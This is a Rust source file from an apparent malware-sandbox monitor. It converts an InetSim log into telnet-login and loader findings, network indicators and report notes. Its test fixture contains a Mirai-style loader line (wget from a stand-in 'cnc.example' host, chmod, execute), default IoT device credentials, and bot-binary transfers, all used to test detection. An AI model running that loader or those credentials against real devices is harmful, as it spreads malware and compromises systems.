// SPDX-License-Identifier: GPL-3.0-only
//! What the InetSim route's built-in services saw, from the log the gateway
//! wrote into the run's folder (`inetsim.json`): findings for the telnet
//! logins, the loader lines and the transfers; indicators for the URLs and
//! hosts the guest asked for; the rows of the Network view's InetSim tab; and
//! the stand-ins the services served, which are labelled and never counted as
//! the sample's payload or an indicator.
use super::*;
use antinomie_monitor_core::{
    ioc::indicator::{Collector, Evidence, Indicator, Jump, Seen, Source, Type, Via},
    route::{InetSimReport, STAND_IN},
    HostClockAnchor,
};
use std::net::IpAddr;

/// The InetSim tab's columns.
pub const HEADERS: &[&str] = &["Time", "Service", "Endpoint", "What", "Detail", "Served"];
/// Lines of a session listed in a finding's details.
const DETAIL_LINES: usize = 24;

fn guest_ns(clock: Option<HostClockAnchor>, ms: u64) -> u64 {
    crate::ioc_scan::guest_ns(clock, ms.saturating_mul(1000))
}

fn evidence() -> Evidence {
    Evidence {
        source: Source::Gateway,
        label: "InetSim log (inetsim.json)".into(),
        jump: Jump::Text,
    }
}

fn seen(ms: u64, note: Option<String>) -> Seen {
    Seen {
        time_us: Some(ms.saturating_mul(1000)),
        evidence: Some(evidence()),
        ok: Some(true),
        note,
        ..Seen::default()
    }
}

/// `host` as an address, or `None` for a name.
fn address(host: &str) -> Option<IpAddr> {
    host.trim_start_matches('[')
        .trim_end_matches(']')
        .parse()
        .ok()
}

/// The URLs, hosts and endpoints of the downloads typed into telnet sessions
/// and of the FTP and TFTP transfers, as indicators. HTTP requests are in
/// the capture and come from there.
pub fn feed(collector: &mut Collector, report: &InetSimReport) {
    let downloads = report.sessions.iter().flat_map(|session| {
        session.downloads.iter().map(move |d| {
            (
                d.ms,
                d.tool.as_str(),
                d.url.as_str(),
                d.host.as_str(),
                d.port,
                d.name.as_str(),
                d.served.as_str(),
                session.endpoint.as_str(),
            )
        })
    });
    let transfers = report
        .transfers
        .iter()
        .filter(|t| t.protocol != "http")
        .map(|t| {
            let port = if t.protocol == "ftp" { 21 } else { 69 };
            (
                t.ms,
                t.protocol.as_str(),
                t.url.as_str(),
                t.host.as_str(),
                port,
                t.name.as_str(),
                t.served.as_str(),
                t.endpoint.as_str(),
            )
        });
    for (ms, tool, url, host, port, name, served, via) in downloads.chain(transfers) {
        if host.is_empty() {
            continue;
        }
        let note = Some(if served.is_empty() {
            format!("{tool} through {via}")
        } else {
            format!("{tool} through {via}; the answer was the {served}")
        });
        let method = match tool {
            "tftp" => "TFTP",
            "ftp" | "ftpget" | "ftpput" => "FTP",
            _ => "GET",
        };
        let endpoint = address(host).map(|ip| (ip, port));
        if url.starts_with("http") {
            let authority = if port == 80 {
                host.to_owned()
            } else {
                format!("{host}:{port}")
            };
            collector.url(
                method,
                &authority,
                name,
                "",
                None,
                endpoint,
                Source::Gateway,
                seen(ms, note.clone()),
            );
        } else {
            collector.url(
                method,
                host,
                name,
                url.split("://").next().unwrap_or(""),
                None,
                endpoint,
                Source::Gateway,
                seen(ms, note.clone()),
            );
        }
        match endpoint {
            Some((ip, port)) => collector.endpoint(
                ip,
                port,
                if tool == "tftp" { "udp" } else { "tcp" },
                Source::Gateway,
                seen(ms, note),
            ),
            None => collector.domain(host, Via::Gateway, &[], Source::Gateway, seen(ms, note)),
        }
    }
}

/// Marks every file indicator whose SHA-256 is one of the stand-ins the
/// services serve: it is InetSim's, not the sample's, and no indicator.
pub fn mark_stand_ins(indicators: &mut [Indicator]) {
    for indicator in indicators.iter_mut().filter(|i| i.ty == Type::File) {
        let Some(sha) = indicator.hashes.as_ref().map(|h| h.sha256.clone()) else {
            continue;
        };
        if let Some(what) = antinomie_monitor_core::route::stand_in_described(&sha) {
            indicator.noise = Some(format!(
                "{what} (Antinomie's own harmless file, not the sample's payload)"
            ));
        }
    }
}

/// One row of the InetSim tab.
fn row(
    ms: u64,
    service: &str,
    endpoint: &str,
    what: String,
    detail: String,
    served: &str,
) -> Vec<Cell> {
    let mut time = crate::table::cell(
        crate::time_format::unix_us(ms.saturating_mul(1000)),
        crate::tone::muted(),
        false,
    );
    time.values = vec![("inetsim.ms", RowValue::Number(i128::from(ms)))];
    vec![
        time,
        crate::table::cell(service, crate::tone::text(), false),
        crate::table::cell(endpoint, crate::tone::text(), true),
        crate::table::cell(what, crate::tone::text(), false),
        crate::table::cell(detail, crate::tone::muted(), true),
        crate::table::cell(
            served,
            if served.starts_with(STAND_IN) {
                crate::tone::warn()
            } else {
                crate::tone::muted()
            },
            false,
        ),
    ]
}

/// The rows of the InetSim tab: each session, each download it asked for,
/// each transfer, in time order.
pub fn rows(report: &InetSimReport) -> Vec<Vec<Cell>> {
    let mut rows: Vec<(u64, Vec<Cell>)> = Vec::new();
    for session in &report.sessions {
        let logins: Vec<String> = session
            .logins
            .iter()
            .map(|l| {
                format!(
                    "{}/{}{}",
                    l.user,
                    l.password,
                    if l.accepted { "" } else { " (refused)" }
                )
            })
            .collect();
        let what = format!(
            "{} session: {} lines, {} logins tried, ended: {}",
            session.service,
            session.lines.len() as u64 + session.lines_omitted,
            session.logins.len(),
            if session.ended.is_empty() {
                "still open at the run's end"
            } else {
                session.ended.as_str()
            }
        );
        let lines: Vec<&str> = session
            .lines
            .iter()
            .take(6)
            .map(|l| l.text.as_str())
            .collect();
        let detail = format!("logins: {}; {}", logins.join(", "), lines.join(" ⏎ "));
        rows.push((
            session.start_ms,
            row(
                session.start_ms,
                &session.service,
                &session.endpoint,
                what,
                detail,
                "",
            ),
        ));
        for d in &session.downloads {
            let what = format!("{} asked for {}", d.tool, d.url);
            let detail = if d.saved_as.is_empty() {
                String::new()
            } else {
                format!("saved as {}", d.saved_as)
            };
            rows.push((
                d.ms,
                row(
                    d.ms,
                    &session.service,
                    &session.endpoint,
                    what,
                    detail,
                    &d.served,
                ),
            ));
        }
        for w in &session.written {
            let what = format!("wrote {} with echo ({} bytes)", w.name, w.size);
            rows.push((
                session.end_ms,
                row(
                    session.end_ms,
                    &session.service,
                    &session.endpoint,
                    what,
                    format!("SHA-256 {}", w.sha256),
                    "",
                ),
            ));
        }
        for x in &session.executed {
            rows.push((
                session.end_ms,
                row(
                    session.end_ms,
                    &session.service,
                    &session.endpoint,
                    format!("ran {x}"),
                    String::new(),
                    "",
                ),
            ));
        }
    }
    for t in &report.transfers {
        let what = format!(
            "{} {} {} ({} bytes)",
            t.protocol.to_ascii_uppercase(),
            t.direction,
            t.url,
            t.size
        );
        let mut detail = format!("SHA-256 {}", t.sha256);
        if !t.artifact.is_empty() {
            detail.push_str(&format!("; kept as {}", t.artifact));
        }
        if t.truncated {
            detail.push_str("; cut at the size limit");
        }
        rows.push((
            t.ms,
            row(t.ms, &t.protocol, &t.endpoint, what, detail, &t.served),
        ));
    }
    if report.sessions_refused > 0 {
        rows.push((
            u64::MAX,
            row(
                0,
                "limit",
                "",
                format!(
                    "{} sessions hung up: the run's session limit was reached",
                    report.sessions_refused
                ),
                String::new(),
                "",
            ),
        ));
    }
    rows.sort_by_key(|(ms, _)| *ms);
    rows.into_iter().map(|(_, row)| row).collect()
}

impl rules::Engine {
    /// The findings of the built-in services' log: a telnet login (with the
    /// logins tried), the download lines a session typed, the stand-ins
    /// served and the files uploaded. The host saw them, not a task.
    pub fn inetsim_report(&mut self, report: &InetSimReport, clock: Option<HostClockAnchor>) {
        const EVIDENCE: &str = "inetsim.json in the run's folder";
        const PROCESS: &str = "VM-wide (seen by the InetSim route's built-in services)";
        for session in report.sessions.iter().filter(|s| s.service == "telnet") {
            let at = guest_ns(clock, session.start_ms);
            let end = guest_ns(clock, session.end_ms.max(session.start_ms));
            if let Some(login) = session.logins.iter().find(|l| l.accepted) {
                let mut detail: Vec<String> = session
                    .logins
                    .iter()
                    .map(|l| {
                        format!(
                            "login {} / {}: {}",
                            l.user,
                            l.password,
                            if l.accepted { "accepted" } else { "refused" }
                        )
                    })
                    .collect();
                detail.extend(
                    session
                        .lines
                        .iter()
                        .take(DETAIL_LINES)
                        .map(|l| format!("typed: {}", l.text)),
                );
                self.host_row_from(
                    "network.inetsim_telnet_login",
                    (
                        session.endpoint.clone(),
                        format!(
                            "logged into the fake telnet device at {} as {} after {} tries",
                            session.endpoint,
                            login.user,
                            session.logins.len()
                        ),
                    ),
                    (at, 1, end),
                    detail,
                    PROCESS,
                    EVIDENCE,
                );
            }
            if !session.downloads.is_empty() {
                let detail = session
                    .downloads
                    .iter()
                    .map(|d| {
                        let served = if d.served.is_empty() {
                            String::new()
                        } else {
                            format!(" (answered with the {})", d.served)
                        };
                        format!("{}: {}{served}", d.tool, d.url)
                    })
                    .chain(session.executed.iter().map(|x| format!("ran {x}")))
                    .collect();
                self.host_row_from(
                    "network.inetsim_loader",
                    (
                        session.endpoint.clone(),
                        format!(
                            "typed a loader into the fake telnet device at {}: {} download{}",
                            session.endpoint,
                            session.downloads.len(),
                            if session.downloads.len() == 1 {
                                ""
                            } else {
                                "s"
                            }
                        ),
                    ),
                    (at, session.downloads.len() as u64, end),
                    detail,
                    PROCESS,
                    EVIDENCE,
                );
            }
        }
        for t in &report.transfers {
            let at = guest_ns(clock, t.ms);
            let (rule, summary) = match t.direction.as_str() {
                "upload" => (
                    "network.inetsim_upload",
                    format!(
                        "uploaded {} ({} bytes) over {} to {}",
                        t.name,
                        t.size,
                        t.protocol.to_ascii_uppercase(),
                        t.endpoint
                    ),
                ),
                _ if t.served.starts_with(STAND_IN) => (
                    "network.inetsim_download",
                    format!(
                        "downloaded {} over {}; InetSim answered with its {}",
                        t.url,
                        t.protocol.to_ascii_uppercase(),
                        t.served
                            .trim_start_matches(STAND_IN)
                            .trim_start_matches(": ")
                    ),
                ),
                _ if t.protocol != "http" => (
                    "network.inetsim_download",
                    format!(
                        "downloaded {} over {}",
                        t.url,
                        t.protocol.to_ascii_uppercase()
                    ),
                ),
                _ => continue,
            };
            let mut detail = vec![format!("SHA-256 {} ({} bytes)", t.sha256, t.size)];
            if !t.served.is_empty() {
                detail.push(format!("served: {}, not the sample's payload", t.served));
            }
            if !t.artifact.is_empty() {
                detail.push(format!("kept in the run's folder as {}", t.artifact));
            }
            self.host_row_from(
                rule,
                (t.url.clone(), summary),
                (at, 1, at),
                detail,
                PROCESS,
                EVIDENCE,
            );
        }
    }
}

/// The report's InetSim notes: one per session and per transfer, in words,
/// for the JSON, STIX and MISP exports.
pub fn notes(report: &InetSimReport) -> Vec<antinomie_monitor_core::report::InetSimNote> {
    use antinomie_monitor_core::report::InetSimNote;
    let mut out = Vec::new();
    for s in &report.sessions {
        let mut detail: Vec<String> = s
            .logins
            .iter()
            .map(|l| {
                format!(
                    "login {} / {} {}",
                    l.user,
                    l.password,
                    if l.accepted { "accepted" } else { "refused" }
                )
            })
            .collect();
        detail.extend(s.downloads.iter().map(|d| {
            format!(
                "{} {}{}",
                d.tool,
                d.url,
                if d.served.is_empty() {
                    String::new()
                } else {
                    format!(" ({})", d.served)
                }
            )
        }));
        detail.extend(
            s.lines
                .iter()
                .take(DETAIL_LINES)
                .map(|l| format!("typed: {}", l.text)),
        );
        out.push(InetSimNote {
            kind: format!("{}-session", s.service),
            summary: format!(
                "{} session to {}: {} logins tried, {} lines, {} downloads asked for",
                s.service,
                s.endpoint,
                s.logins.len(),
                s.lines.len() as u64 + s.lines_omitted,
                s.downloads.len()
            ),
            detail,
            stand_in: s.downloads.iter().any(|d| d.served.starts_with(STAND_IN)),
        });
    }
    for t in &report.transfers {
        let stand_in = t.served.starts_with(STAND_IN);
        if t.protocol == "http" && !stand_in {
            continue;
        }
        out.push(InetSimNote {
            kind: format!("{}-{}", t.protocol, t.direction),
            summary: if stand_in {
                format!(
                    "{}: {} answered over {} with SHA-256 {}, not the sample's payload",
                    t.served,
                    t.url,
                    t.protocol.to_ascii_uppercase(),
                    t.sha256
                )
            } else {
                format!(
                    "{} {} {} ({} bytes, SHA-256 {})",
                    t.protocol.to_ascii_uppercase(),
                    t.direction,
                    t.url,
                    t.size,
                    t.sha256
                )
            },
            detail: Vec::new(),
            stand_in,
        });
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::rules::tests::support::{count, list, rows as rule_rows, text, tier};
    use antinomie_monitor_core::route::inetsim_log::{
        Download, Line, Login, Session, Transfer, Written,
    };

    /// A hand-made log: a bot that logged in on the second try and typed a
    /// loader, an FTP download of a stand-in, a TFTP upload, an HTTP stand-in.
    pub fn report() -> InetSimReport {
        let stand_in = format!("{STAND_IN}: program (x86-64)");
        InetSimReport {
            version: 1,
            run: "r1".into(),
            arch: "x86-64".into(),
            stand_ins: true,
            telnet_logins: "defaults".into(),
            sessions: vec![Session {
                id: 1,
                service: "telnet".into(),
                endpoint: "203.0.113.7:23".into(),
                start_ms: 1_000,
                end_ms: 4_000,
                logins: vec![
                    Login {
                        user: "admin".into(),
                        password: "admin1".into(),
                        accepted: false,
                    },
                    Login {
                        user: "root".into(),
                        password: "xc3511".into(),
                        accepted: true,
                    },
                ],
                lines: vec![
                    Line {
                        ms: 2_000,
                        text: "/bin/busybox ECCHI".into(),
                    },
                    Line {
                        ms: 3_000,
                        text: "wget http://cnc.example/bins/sora.x86 -O s; chmod 777 s; ./s".into(),
                    },
                ],
                ended: "logged out".into(),
                downloads: vec![
                    Download {
                        ms: 3_000,
                        tool: "wget".into(),
                        url: "http://cnc.example/bins/sora.x86".into(),
                        host: "cnc.example".into(),
                        port: 80,
                        name: "/bins/sora.x86".into(),
                        saved_as: "s".into(),
                        served: stand_in.clone(),
                    },
                    Download {
                        ms: 3_100,
                        tool: "tftp".into(),
                        url: "tftp://198.51.100.10/t.arm".into(),
                        host: "198.51.100.10".into(),
                        port: 69,
                        name: "t.arm".into(),
                        saved_as: "t.arm".into(),
                        served: stand_in.clone(),
                    },
                ],
                written: vec![Written {
                    name: ".d".into(),
                    size: 4,
                    sha256: "ab".repeat(32),
                    artifact: "inetsim-uploads/0001-.d".into(),
                }],
                executed: vec![format!("./s ({stand_in})")],
                ..Session::default()
            }],
            transfers: vec![
                Transfer {
                    ms: 5_000,
                    protocol: "ftp".into(),
                    direction: "download".into(),
                    endpoint: "198.51.100.21:21".into(),
                    host: "198.51.100.21".into(),
                    name: "/pub/bot.mips".into(),
                    url: "ftp://198.51.100.21/pub/bot.mips".into(),
                    size: 132,
                    sha256: "cd".repeat(32),
                    served: stand_in.clone(),
                    session: 2,
                    ..Transfer::default()
                },
                Transfer {
                    ms: 6_000,
                    protocol: "tftp".into(),
                    direction: "upload".into(),
                    endpoint: "198.51.100.69:69".into(),
                    host: "198.51.100.69".into(),
                    name: "loot.bin".into(),
                    url: "tftp://198.51.100.69/loot.bin".into(),
                    size: 19,
                    sha256: "ef".repeat(32),
                    artifact: "inetsim-uploads/0002-loot.bin".into(),
                    ..Transfer::default()
                },
                Transfer {
                    ms: 7_000,
                    protocol: "http".into(),
                    direction: "download".into(),
                    endpoint: "198.51.100.1:80".into(),
                    host: "cnc.example".into(),
                    name: "/bins.sh".into(),
                    url: "http://cnc.example/bins.sh".into(),
                    size: 17,
                    served: format!("{STAND_IN}: script"),
                    ..Transfer::default()
                },
            ],
            ..InetSimReport::default()
        }
    }

    #[test]
    fn the_log_becomes_findings_with_the_logins_and_loader_lines() {
        let mut engine = rules::Engine::new(rules::Options::default());
        engine.inetsim_report(&report(), None);
        let out = engine.finish(&Default::default());
        let login = rule_rows(&out, "network.inetsim_telnet_login");
        assert_eq!(login.len(), 1);
        assert_eq!(text(login[0], "finding.object"), "203.0.113.7:23");
        let detail = list(login[0], "finding.detail");
        assert!(
            detail.contains(&"login admin / admin1: refused".to_owned()),
            "{detail:?}"
        );
        assert!(detail.contains(&"login root / xc3511: accepted".to_owned()));
        assert!(detail.iter().any(|l| l == "typed: /bin/busybox ECCHI"));
        assert_eq!(
            tier(&out, "network.inetsim_loader").as_deref(),
            Some("high")
        );
        let loader = rule_rows(&out, "network.inetsim_loader");
        assert_eq!(count(loader[0]), 2);
        assert!(list(loader[0], "finding.detail")
            .iter()
            .any(|l| l.starts_with("wget: http://cnc.example/bins/sora.x86 (answered with the stand-in served by InetSim")));
        assert_eq!(list(loader[0], "finding.technique"), ["T1105", "T1059.004"]);
        // The FTP and HTTP stand-ins are downloads; the TFTP upload is one too.
        assert_eq!(rule_rows(&out, "network.inetsim_download").len(), 2);
        let upload = rule_rows(&out, "network.inetsim_upload");
        assert_eq!(upload.len(), 1);
        assert!(list(upload[0], "finding.detail")
            .iter()
            .any(|l| l.contains("inetsim-uploads/0002-loot.bin")));
        let mut empty = rules::Engine::new(rules::Options::default());
        empty.inetsim_report(&InetSimReport::default(), None);
        assert!(empty.finish(&Default::default()).rows.is_empty());
    }

    #[test]
    fn download_lines_and_transfers_are_indicators_and_stand_ins_are_noise() {
        let mut collector = Collector::default();
        feed(&mut collector, &report());
        let found = collector.finish();
        let values: Vec<(&str, &str)> = found
            .iter()
            .map(|i| (i.ty.id(), i.value.as_str()))
            .collect();
        assert!(
            values.contains(&("url", "GET cnc.example/bins/sora.x86")),
            "{values:?}"
        );
        assert!(
            values.contains(&("url", "TFTP 198.51.100.10/t.arm")),
            "{values:?}"
        );
        assert!(
            values.contains(&("url", "FTP 198.51.100.21/pub/bot.mips")),
            "{values:?}"
        );
        assert!(values.contains(&("domain", "cnc.example")), "{values:?}");
        assert!(
            values.contains(&("endpoint", "198.51.100.10:69")),
            "{values:?}"
        );
        // HTTP requests come from the capture, not from the log.
        assert!(!values.iter().any(|(_, v)| v.contains("bins.sh")));
        let url = found
            .iter()
            .find(|i| i.value == "GET cnc.example/bins/sora.x86")
            .unwrap();
        assert!(url.sources.contains(&Source::Gateway));
        assert!(
            url.details
                .iter()
                .any(|(_, d)| d.contains("stand-in served by InetSim")),
            "{:?}",
            url.details
        );
        // A file with a stand-in's hash is InetSim's, not an indicator.
        let (sha, _) = antinomie_monitor_core::route::stand_in_hashes()[1].clone();
        let mut files = Collector::default();
        files.file(
            "/tmp/s",
            "executed",
            Some(antinomie_monitor_core::ioc::indicator::Hashes {
                sha256: sha,
                ..Default::default()
            }),
            Source::Syscall,
            Seen::default(),
        );
        files.file(
            "/tmp/other",
            "executed",
            Some(antinomie_monitor_core::ioc::indicator::Hashes {
                sha256: "00".repeat(32),
                ..Default::default()
            }),
            Source::Syscall,
            Seen::default(),
        );
        let mut indicators = files.finish();
        mark_stand_ins(&mut indicators);
        let marked: Vec<bool> = indicators
            .iter()
            .map(|i| i.noise.as_deref().is_some_and(|n| n.starts_with(STAND_IN)))
            .collect();
        assert_eq!(marked.iter().filter(|m| **m).count(), 1);
        assert!(indicators
            .iter()
            .find(|i| i.path == "/tmp/s")
            .unwrap()
            .noise
            .as_deref()
            .unwrap()
            .contains("program (arm64)"));
    }

    #[test]
    fn the_tab_rows_and_the_report_notes_label_the_stand_ins() {
        let rows = rows(&report());
        // A session, its two downloads, the echo-written file, the run, three transfers.
        assert_eq!(rows.len(), 8);
        assert!(rows.iter().all(|row| row.len() == HEADERS.len()));
        assert!(rows[0][3]
            .text
            .starts_with("telnet session: 2 lines, 2 logins tried"));
        assert!(rows
            .iter()
            .any(|row| row[5].text == format!("{STAND_IN}: program (x86-64)")));
        let notes = notes(&report());
        assert_eq!(notes.len(), 4);
        assert_eq!(notes[0].kind, "telnet-session");
        assert!(notes[0].stand_in);
        assert!(notes[1]
            .summary
            .starts_with("stand-in served by InetSim: program (x86-64): ftp://"));
        assert!(notes[1].summary.contains("not the sample's payload"));
        assert_eq!(notes[2].kind, "tftp-upload");
        assert!(!notes[2].stand_in);
        assert_eq!(notes[3].kind, "http-download");
    }
}
